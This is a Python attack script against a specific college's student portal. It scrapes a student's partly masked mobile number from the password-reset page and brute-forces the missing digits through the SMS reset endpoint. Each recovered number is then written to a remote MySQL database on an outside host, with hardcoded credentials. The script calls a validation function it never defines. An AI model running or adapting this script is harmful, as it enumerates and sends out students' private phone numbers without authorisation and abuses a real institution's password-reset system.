## AUGUST 7 2022
## DEVELOPED BY DHANUSHKKAR
import requests
from itertools import product
import random
from bs4 import BeautifulSoup
import time
import mysql.connector

##the meat
def meat():

    ##gets the first 7 digits
    url1 = (
        "http://portal.stjosephstechnology.ac.in/portal/forgotPassword?Username=%s"
        % uname
    )
    resp = requests.get(url1)
    bobby = resp.text
    dog = BeautifulSoup(bobby, "html.parser")
    finale = dog.find(id="mobile")
    finale1 = str(finale)
    dude = finale1
    final_data = ""
    for c in dude:
        if c.isdigit() == True:
            final_data = final_data + c

    ##the cracking and verification part

    chars = "0123456789"  # chars to look for
    count = 599
    for length in range(3, 4):  # only do lengths of 1 + 2
        to_attempt = product(chars, repeat=length)
    for attempt in to_attempt:
        otp = "".join(attempt)
        mobile = final_data
        lmobile = mobile + otp
        url36 = "http://portal.stjosephstechnology.ac.in/portal/SendPasswordSMS"
        my_data = {"user": uname, "mobile": lmobile}
        dump = requests.post(url36, data=my_data)
        dump_text = dump.text
        if "sent" in dump_text:
            print("hacked: " + lmobile)
            save_data(lmobile, uname)
            break
        else:
            count += -1
            print("countdown:breaking in %i seconds" % count)


###saves data after cracking
def save_data(lmobile, uname):
    db = mysql.connector.connect(
        user="WFmgDnlJuc",
        password="vdNyHUl9WS",
        host="remotemysql.com",
        db="WFmgDnlJuc",
    )

    mycursor = db.cursor()

    mycursor.execute(
        "insert into register (uname,lmobile) VALUES (%s,%s)", (uname, lmobile)
    )
    db.commit()
    if True:
        print("commit successfully")
    else:
        print("commit failed")


##storage part
def storage():
    db = mysql.connector.connect(
        user="WFmgDnlJuc",
        password="vdNyHUl9WS",
        host="remotemysql.com",
        db="WFmgDnlJuc",
    )

    mycursor = db.cursor()

    mycursor.execute("select lmobile from register where uname=%s", (uname,))
    lresults = mycursor.fetchall()

    if not lresults:
        print("not found. starting attack")
        meat()
    else:
        for item in lresults:
            print("hacked: " + str(item[0]))


##gets the username

print("enter roll")
uname = input()
validate(uname)
if validate(uname) is True:
    storage()
else:
    print("enter valid roll")
    SystemExit()
